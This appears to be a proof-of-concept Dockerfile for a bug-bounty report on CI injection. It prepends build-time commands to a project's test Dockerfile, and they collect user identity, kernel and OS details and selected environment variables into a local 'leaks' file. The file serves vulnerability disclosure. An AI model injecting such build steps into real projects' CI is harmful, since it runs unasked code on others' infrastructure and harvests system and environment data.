# PoC Dockerfile for Safe RCE Demonstration via CI Injection
# HackerOne Report #3154543

FROM python:3.11-alpine

# Simulated RCE Payload – Exfiltrates system & identity info to /tmp/leaks.txt
RUN echo "SAFE_RCE_PROOF" > /tmp/leaks.txt && \
    echo "[+] Executing PAYLOAD_CMD..." >> /tmp/leaks.txt && \
    whoami >> /tmp/leaks.txt && \
    id >> /tmp/leaks.txt && \
    uname -a >> /tmp/leaks.txt && \
    echo "[+] OS Info:" >> /tmp/leaks.txt && \
    cat /etc/os-release >> /tmp/leaks.txt && \
    echo "[+] ENV (Sanitized):" >> /tmp/leaks.txt && \
    env | grep -E '^(PATH|LANG|PYTHON_VERSION|HOME|SHELL|USER)' >> /tmp/leaks.txt && \
    echo "[+] Done." >> /tmp/leaks.txt

# --- Original Dockerfile.test content continues below ---
RUN apk add --no-cache build-base

COPY . /app
WORKDIR /app
RUN pip install -e .

CMD ["pytest"]
